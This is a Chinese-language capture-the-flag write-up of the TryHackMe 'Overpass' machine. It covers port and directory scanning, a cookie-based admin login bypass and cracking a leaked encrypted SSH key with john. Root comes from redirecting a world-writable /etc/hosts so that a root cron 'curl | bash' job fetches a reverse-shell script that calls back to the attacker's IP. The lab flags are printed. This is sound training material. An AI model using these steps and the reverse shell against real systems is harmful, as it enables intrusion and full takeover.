# 服务发现
```
┌──(root💀kali)-[~]
└─#  nmap -sV -Pn 10.10.74.226                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 02:33 EDT
Nmap scan report for 10.10.74.226
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds
```

# web目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─#  python3 dirsearch.py  -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100 -u  http://10.10.74.226 

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-22_02-36-52.log

Target: http://10.10.74.226

[02:36:53] Starting: 
[02:36:54] 301 -    0B  - /img  ->  img/
[02:36:54] 200 -    2KB - /        
[02:36:54] 301 -    0B  - /downloads  ->  downloads/
[02:36:55] 301 -    0B  - /aboutus  ->  aboutus/
[02:36:55] 301 -   42B  - /admin  ->  /admin/
[02:36:56] 301 -    0B  - /css  ->  css/    
```

# web站点分析

首页是一个密码软件的介绍页面
首页源代码有一行注释:``` Yeah right, just because the Romans used it doesn't make it military grade, change this?```


/download页面可以下载到网站的源码（一个go文件，文件名：overpass.go），部署脚本（一个sh文件，文件名：buildscript.sh）
# 源代码分析
```overpass.go```分析
总共5个分支：
1，Retrieve Password For Service
2，Set or Update Password For Service
3，Delete Password For Service
4，Retrieve All Passwords
5，Exit
其余模块是对于各个分支的代码实现，看上去所有保存下来的密码加密以后都会保存到当前用户home目录下的```.overpass```文件
把编译后的可执行文件保存到本地，原本想如果网站上有这个程序，那也许找到这个.overpass文件就可以拿到一份各个服务的密码，但搜索好久好像都找不到。。。

下载一个可执行程序，尝试保存ssh的密码123456，发现本目录果然生成了一个密文文件,加密算法是rot47
```
┌──(root💀kali)-[~]
└─#  pwd             
/root
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~]
└─#  cat .overpass 
,LQ?2>6QiQDD9Q[QA2DDQiQ`abcdeQN. 
```


```buildscript.sh```分析
编译overpass.go，打印编译成功信息，暴露源码路径为$HOME目录下的/builds/overpassLinux ：```~/builds/overpassLinux```

/about页面关于软件理念和开发人员的介绍，收集到可能的用户名。源代码无发现
```
Ninja
Pars
Szymex
Bee
MuirlandOracle
```

/img /css 无特别发现

/admin是一个登陆界面,查看网页源代码，其中login.js里有一段
```
async function login() {
    const usernameBox = document.querySelector("# username");
    const passwordBox = document.querySelector("# password");
    const loginStatus = document.querySelector("# loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
留意```Cookies.set("SessionToken",statusOrCookie)```,登录通过后会在cookie生成一个SessionToken的变量


我们在/admin下，按f12，在console里面输入```Cookies.set("SessionToken","")```就可以绕过登录，直接跳转到/admin登录后页面

# 打开http://10.10.74.226/admin/，显示
```
Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, MacOS and more

Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----

```

上面暴露了两个可能的用户名```James```和```Paradox```,并且给出了```James```的ssh私钥文件

使用ssh2john把私钥保存成hash.txt，然后用john破解，成功破解出私钥密码：```james13```
```
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  /usr/share/john/ssh2john.py id_rsa >hash.txt                                                                                                                                                                                      127 ⨯
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  cat hash.txt    
id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  john hash.txt                                                        
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
james13          (id_rsa)
```

# 登录james的账号，拿到user.txt
```
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  ssh james@10.10.74.226 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 22 08:55:20 UTC 2021

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 21%                IP address for eth0: 10.10.74.226
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$ 

```

# 查看另一个todo文件
```
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website

```

# 传linpea，枚举提权信息,有一个cron任务是用root执行的,每分钟执行一次
```* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash```

# 分析
这个定时任务是通过curl的http访问overpass.thm站点下的/downloads/src/buildscript.sh文件，访问成功以后通过管道符把上一个命令的执行的结果传送到```bash```命令


但是找不到downloads/src/buildscript.sh这个文件，貌似没有权限进去

全局查找```.overpass```文件
```find / -name .overpass```

在/home/james/下找到
```
cat /home/james/.overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

把.overpass传回攻击机根目录，执行overpassLinux
```
└─#  ./overpassLinux
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
System   saydrawnlyingpicture

```

得到```System   saydrawnlyingpicture```经验证这个是james的ssh密码,不过好像没啥卵用。。。

# 查看/etc/hosts权限，发现是可写的
```
james@overpass-prod:~$ ll /etc/hosts
-rw-rw-rw- 1 root root 253 Sep 22 10:20 /etc/hosts
```

# 查看/etc/hosts文件
```
james@overpass-prod:/home$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
#  The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
由上可知overpass.thm这个域名是绑定在127.0.0.1下的，假如我们可以把这个域名指向到一个我们可以编辑的文件夹，那么就可以利用上面的cron提权

# 编辑
把127.0.0.1 overpass.thm 变成 10.13.21.169 overpass.thm，指向我们的攻击机
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.13.21.169 overpass.thm
#  The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```


# 在攻击机执行
```
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  mkdir -p downloads/src/
                                                                                                                                                                                                                                 
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  echo "bash -i >& /dev/tcp/10.13.21.169/4444 0>&1" > ./downloads/src/buildscript.sh                                                                                                                                                  1 ⨯
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  chmod +x ./downloads/src/buildscript.sh 
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.74.226 - - [22/Sep/2021 06:23:45] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

# 在攻击机另起一个shell，开始监听,拿到root shell

```
┌──(root💀kali)-[~/tryhackme/overpass]
└─#  nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.74.226] 46586
bash: cannot set terminal process group (2376): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~#  id
id
uid=0(root) gid=0(root) groups=0(root)
root@overpass-prod:~#  cat /root/root.txt        
cat /root/root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
root@overpass-prod:~#  
```